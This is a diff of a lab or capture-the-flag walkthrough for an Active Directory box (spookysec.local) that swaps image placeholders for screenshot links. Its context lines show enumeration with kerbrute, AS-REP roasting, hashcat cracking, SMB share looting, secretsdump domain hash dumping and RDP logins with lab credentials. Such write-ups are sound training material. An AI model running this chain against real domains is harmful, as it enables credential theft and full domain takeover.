@@ -20,7 +20,7 @@ enum4linux IP
 
 1. The answer is: `THM-AD`
 
-[SCREEN01]
+![SCREEN01](https://github.com/user-attachments/assets/2445c332-9f08-4487-8105-206314c7be69)
 
 ---
 
@@ -44,7 +44,7 @@ _./kerbrute -h may help you_
 kerbrute -h
 ```
 
-[SCREEN02]
+![SCREEN02](https://github.com/user-attachments/assets/42e27dee-33e8-45df-9236-0331564384ad)
 
 ---
 
@@ -56,7 +56,7 @@ kerbrute -h
 kerbrute userenum -d spookysec.local --dc IP userlist.txt
 ```
 
-[SCREEN03]
+![SCREEN03](https://github.com/user-attachments/assets/649f435f-c91c-46dc-bff9-591d60bb6ac4)
 
 ---
 
@@ -76,7 +76,7 @@ kerbrute userenum -d spookysec.local --dc IP userlist.txt
 python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -usersfile userlist.txt -dc-ip IP -no-pass | grep -v "KDC_ERR"
 ```
 
-[SCREEN04]
+![SCREEN04](https://github.com/user-attachments/assets/80209966-baee-4197-8e5b-c05ea81f6813)
 
 ---
 
@@ -88,7 +88,7 @@ _https://hashcat.net/wiki/doku.php?id=example_hashes and searching for the first
 
 1. The answers are: `Kerberos 5 AS-REP etype 23`, and `18200`
 
-[SCREEN05]
+![SCREEN05](https://github.com/user-attachments/assets/32339287-dc5b-465f-b30a-9dd0e30ff807)
 
 ---
 
@@ -100,7 +100,7 @@ _https://hashcat.net/wiki/doku.php?id=example_hashes and searching for the first
 hashcat -m 18200 -a 0 hash passwordlist.txt
 ```
 
-[SCREEN06]
+![SCREEN06](https://github.com/user-attachments/assets/6ae22c2d-8698-4205-8e44-397bf6c6f767)
 
 ---
 
@@ -120,7 +120,7 @@ _man smbclient will tell you a little bit about the tool!_
 
 1. The answer is: `-L`
 
-[SCREEN07]
+![SCREEN07](https://github.com/user-attachments/assets/5bd76672-309d-4b16-831a-7c89bfd420c2)
 
 ---
 
@@ -132,7 +132,7 @@ _man smbclient will tell you a little bit about the tool!_
 smbclient -L //IP -U svc-admin
 ```
 
-[SCREEN08]
+![SCREEN08](https://github.com/user-attachments/assets/9ccec722-174d-48e3-ad62-1b904e7643df)
 
 ---
 
@@ -148,7 +148,7 @@ ls
 mget *
 ```
 
-[SCREEN09]
+![SCREEN09](https://github.com/user-attachments/assets/14c5d778-a682-46b8-aaec-bbdfe08f642b)
 
 ---
 
@@ -156,7 +156,7 @@ mget *
 
 1. Decode the string from Base64 in [CyberChef](https://gchq.github.io/CyberChef/) to get `backup@spookysec.local:backup2517860`
 
-[SCREEN10]
+![SCREEN10](https://github.com/user-attachments/assets/0c379e1e-7030-49c3-a6a0-ada734c6da2e)
 
 ---
 
@@ -174,7 +174,7 @@ _Read the secretsdump output!_
 python3.9 /opt/impacket/examples/secretsdump.py -just-dc spookysec.local/backup:backup2517860@IP
 ```
 
-[SCREEN11]
+![SCREEN11](https://github.com/user-attachments/assets/d4807bf1-3dbf-4291-ae82-4f9191f81fbe)
 
 ---
 
@@ -194,7 +194,7 @@ _if Evil-WinRM is not installed, you can do so by issuing "gem install evil-winr
 evil-winrm
 ```
 
-[SCREEN12]
+![SCREEN12](https://github.com/user-attachments/assets/70657ab3-b3cb-455f-8a9e-a45da178b302)
 
 # Flag Submission Panel
 
@@ -204,7 +204,7 @@ evil-winrm
 xfreerdp /u:svc-admin /p:management2005 /v:IP
 ```
 
-[SCREEN13]
+![SCREEN13](https://github.com/user-attachments/assets/036d510d-bf88-4e41-89d9-850ece7a4226)
 
 ---
 
@@ -214,7 +214,7 @@ xfreerdp /u:svc-admin /p:management2005 /v:IP
 xfreerdp /u:backup /p:backup2517860 /v:IP
 ```
 
-[SCREEN14]
+![SCREEN14](https://github.com/user-attachments/assets/b84f2d3f-02db-4480-866f-6b7756066353)
 
 ### Administrator
 
@@ -224,4 +224,4 @@ cd ../Desktop
 more root.txt
 ```
 
-[SCREEN15]
+![SCREEN15](https://github.com/user-attachments/assets/348108d9-6967-4a08-be16-bd42eccf81a6)
